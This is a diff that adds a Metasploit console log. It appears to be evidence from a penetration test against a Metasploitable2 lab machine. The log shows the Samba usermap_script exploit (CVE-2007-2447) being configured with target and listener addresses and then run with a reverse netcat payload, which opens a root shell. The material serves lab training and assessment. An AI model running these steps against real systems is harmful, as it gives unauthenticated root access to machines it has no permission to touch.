@@ -1,0 +1,151 @@
+[*] Spooling to file /mnt/hgfs/metasploitable2-network-pentest/evidence/F04-samba-metasploit.txt...
+msf > spool /mnt/hgfs/metasploitable2-network-pentest/evidence/F04-samba-metasploit.txtuse PAYLOAD cmd/unix/reverse_perlshow optionssearch usermap_script
+
+Matching Modules
+================
+
+   #  Name                                Disclosure Date  Rank       Check  Description
+   -  ----                                ---------------  ----       -----  -----------
+   0  exploit/multi/samba/usermap_script  2007-05-14       excellent  No     Samba "username map script" Command Execution
+
+
+Interact with a module by name or index. For example info 0, use 0 or use exploit/multi/samba/usermap_script
+
+msf > use 0
+[*] No payload configured, defaulting to cmd/unix/reverse_netcat
+msf exploit(multi/samba/usermap_script) > info
+
+       Name: Samba "username map script" Command Execution
+     Module: exploit/multi/samba/usermap_script
+   Platform: Unix
+       Arch: cmd
+ Privileged: Yes
+    License: Metasploit Framework License (BSD)
+       Rank: Excellent
+  Disclosed: 2007-05-14
+
+Provided by:
+  jduck <jduck@metasploit.com>
+
+Module side effects:
+ unknown-side-effects
+
+Module stability:
+ unknown-stability
+
+Module reliability:
+ unknown-reliability
+
+Available targets:
+      Id  Name
+      --  ----
+  =>  0   Automatic
+
+Check supported:
+  No
+
+Basic options:
+  Name    Current Setting  Required  Description
+  ----    ---------------  --------  -----------
+  RHOSTS                   yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/bas
+                                     ics/using-metasploit.html
+  RPORT   139              yes       The target port (TCP)
+
+Payload information:
+  Space: 1024
+
+Description:
+  This module exploits a command execution vulnerability in Samba
+  versions 3.0.20 through 3.0.25rc3 when using the non-default
+  "username map script" configuration option. By specifying a username
+  containing shell meta characters, attackers can execute arbitrary
+  commands.
+
+  No authentication is needed to exploit this vulnerability since
+  this option is used to map usernames prior to authentication!
+
+References:
+  https://nvd.nist.gov/vuln/detail/CVE-2007-2447
+  OSVDB (34700)
+  http://www.securityfocus.com/bid/23972
+  http://labs.idefense.com/intelligence/vulnerabilities/display.php?id=534
+  http://samba.org/samba/security/CVE-2007-2447.html
+
+
+View the full module info with the info -d command.
+
+msf exploit(multi/samba/usermap_script) > show options
+
+Module options (exploit/multi/samba/usermap_script):
+
+   Name    Current Setting  Required  Description
+   ----    ---------------  --------  -----------
+   RHOSTS                   yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/ba
+                                      sics/using-metasploit.html
+   RPORT   139              yes       The target port (TCP)
+
+
+Payload options (cmd/unix/reverse_netcat):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST  127.0.0.1        yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic
+
+
+
+View the full module info with the info, or info -d command.
+
+msf exploit(multi/samba/usermap_script) > set RHOSTS 192.168.77.20
+RHOSTS => 192.168.77.20
+msf exploit(multi/samba/usermap_script) > set RPORT 445
+RPORT => 445
+msf exploit(multi/samba/usermap_script) > set LHOST 192.168.77.10
+LHOST => 192.168.77.10
+msf exploit(multi/samba/usermap_script) > show options
+
+Module options (exploit/multi/samba/usermap_script):
+
+   Name    Current Setting  Required  Description
+   ----    ---------------  --------  -----------
+   RHOSTS  192.168.77.20    yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/ba
+                                      sics/using-metasploit.html
+   RPORT   445              yes       The target port (TCP)
+
+
+Payload options (cmd/unix/reverse_netcat):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST  192.168.77.10    yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic
+
+
+
+View the full module info with the info, or info -d command.
+
+msf exploit(multi/samba/usermap_script) > run
+[*] Started reverse TCP handler on 192.168.77.10:4444 
+[*] Command shell session 1 opened (192.168.77.10:4444 -> 192.168.77.20:53542) at 2026-10-13 03:28:34 -0400
+
+uid=0(root) gid=0(root)
+root
+metasploitable
+
+Background session 1? [y/N]  msf exploit(multi/samba/usermap_script) > exit
+[*] You have active sessions open, to exit anyway type "exit -y"
+msf exploit(multi/samba/usermap_script) > exit -y
